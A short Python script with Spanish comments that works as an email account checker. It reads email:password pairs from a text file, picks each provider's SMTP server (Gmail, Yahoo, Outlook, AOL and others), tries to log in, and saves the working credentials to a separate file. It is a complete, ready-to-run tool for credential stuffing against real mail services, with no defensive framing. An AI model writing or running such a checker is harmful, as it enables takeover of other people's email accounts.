import yagmail

# Configuración de los servidores SMTP según el proveedor
def configurar_servidor(email, password):
    dominio = email.split('@')[-1]
    
    # Servidores SMTP según el dominio
    servidores = {
        "gmail.com": "smtp.gmail.com",
        "yahoo.com": "smtp.mail.yahoo.com",
        "hotmail.com": "smtp.office365.com",
        "outlook.com": "smtp.office365.com",
        "live.com": "smtp.live.com",
        "aol.com": "smtp.aol.com",
        "att.net": "smtp.mail.att.net"
    }
    
    # Verifica si el dominio es soportado
    if dominio in servidores:
        return yagmail.SMTP(email, password, host=servidores[dominio])
    else:
        raise Exception(f"Proveedor no soportado: {dominio}")

# Leer el archivo con los correos y contraseñas
with open("correos_pruebas.txt", "r") as archivo:
    lineas = archivo.readlines()

# Archivo para guardar solo los correos funcionales
with open("funcionales/funcionales_todos.txt", "w") as funcionales:
    for linea in lineas:
        try:
            # Separar el correo y la contraseña
            email, password = linea.strip().split(":")
            
            # Configurar el servidor SMTP según el proveedor
            servidor = configurar_servidor(email, password)
            
            # Probar la conexión
            servidor.login()
            print(f"Correo funcional: {email}")
            
            # Guardar el correo funcional en el archivo
            funcionales.write(f"{email}:{password}\n")
        
        except Exception as e:
            print(f"Error con la cuenta {email}: {e}")

# Pausar para que la ventana no se cierre automáticamente
input("Presiona Enter para cerrar...")